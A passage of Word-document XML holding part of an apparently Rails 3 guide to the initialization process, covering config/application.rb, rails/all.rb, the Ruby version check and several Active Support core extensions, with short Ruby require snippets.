        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7560"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="55281D01" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C84FE9A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1899783461"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require ::File.expand_path('../config/environment',  __FILE__)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7EED9F01" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.14 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/environment.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF9DBED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file is the common file required by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config.ru</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
      <w:r>
        <w:t>) and Passenger. This is where these two ways to run the server meet; everything before this point has been Rack and Rails setup.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="187708F6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file begins with requiring </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="299F9491" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.15 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A13584A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file requires </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/boot.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, but only if it hasn’t been required before, which would be the case in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> but </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>wouldn’t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> be the case with Passenger.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="032EF204" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Then the fun begins!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0742D8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>2 Loading Rails</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="209C2593" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The next line in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1E3D86CA" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="215A3F5D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="392968680"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'rails/all'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3968A91B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/all.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2C53B6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This file is responsible for requiring all the individual parts of Rails like so:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4560"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="10A9859B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="62946454" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require "rails"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71D9C40D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A43293F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D923FEA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    active_record</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EAAA84F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    action_controller</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3407B04C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    action_mailer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26032608" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    rails/test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61D6D340" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>).each</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|framework|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09732FFF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  begin</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2304F2C6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    require "#{framework}/railtie"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FE2650F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  rescue</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>LoadError</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B4B9CBB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EC89930" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="52774381" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">First off the line is the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> require itself.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44658E8B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071A4CCE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file is responsible for the initial definition of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module and, rather than defining the autoloads like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionDispatch</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and so on, it actually defines other functionality. Such as the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>env</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>application</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> methods which are extremely useful in Rails 3 applications.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17013A4E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">However, before all that takes place the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/ruby_version_check</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file is required first.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2526700B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/ruby_version_check.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EA52831" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This file simply checks if the Ruby version is less than 1.8.7 or is 1.9.1 and raises an error if that is the case. Rails 3 simply will not run on earlier versions of Ruby than 1.8.7 or 1.9.1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3103C39B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You should always endeavor to run the latest version of Ruby with your Rails applications. The benefits are many, including security fixes and the like, and very often there is a speed increase associated with it. The caveat is that you could have code that potentially breaks on the latest version, which should be fixed to work on the latest version rather than kept around as an excuse not to upgrade.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7873E90C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/kernel/reporting.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C0661A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This is the first of the many Active Support core extensions that come with Rails. This one in particular defines methods in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Kernel</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module which is mixed in to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Object</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class so the methods are available on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>main</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and can therefore be called like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1699DE4A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D19A6EC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>silence_warnings do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C257D67" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # some code</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4548D82C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="27F1693E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">These methods can be used to silence </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>STDERR</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> responses and the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>silence_stream</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> allows you to also silence other streams. Additionally, this mixin allows you to suppress exceptions and capture streams. For more information see the </w:t>
      </w:r>
      <w:hyperlink r:id="rId1074" w:anchor="silencing-warnings-streams-and-exceptions" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Silencing Warnings, Streams, and Exceptions</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> section from the Active Support Core Extensions Guide.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735F3760" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/logger.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26DC657F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The next file that is required is another Active Support core extension, this time to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Logger</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class. This begins by defining the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>around_[level]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helpers for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Logger</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class as well as other methods such as a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>datetime_format</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> getter and setter for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>formatter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> object tied to a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Logger</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> object.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702E8A48" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For more information see the </w:t>
      </w:r>
      <w:hyperlink r:id="rId1075" w:anchor="extensions-to-logger" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Extensions to Logger</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> section from the Active Support Core Extensions Guide.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="447BE17E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/application.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8689FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The next file required by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>application.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This file defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Application</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant which the application’s class defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in a standard Rails application depends on. Before the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Application</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class is defined however, there’s some other files that get required first.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4768D2B4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The first of these is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/reverse_merge</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which can be </w:t>
      </w:r>
      <w:hyperlink r:id="rId1076" w:anchor="merging" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>read about in the Active Support Core Extensions guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> under the “Merging” section.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B681FC8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/file_update_checker.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0497EDB6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::FileUpdateChecker</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class defined within this file is responsible for checking if a file has been updated since it was last checked. This is used for monitoring the routes file for changes during development environment runs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53871F7B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.8 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/plugin.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01CF8CA7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file defines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Plugin</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which inherits from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
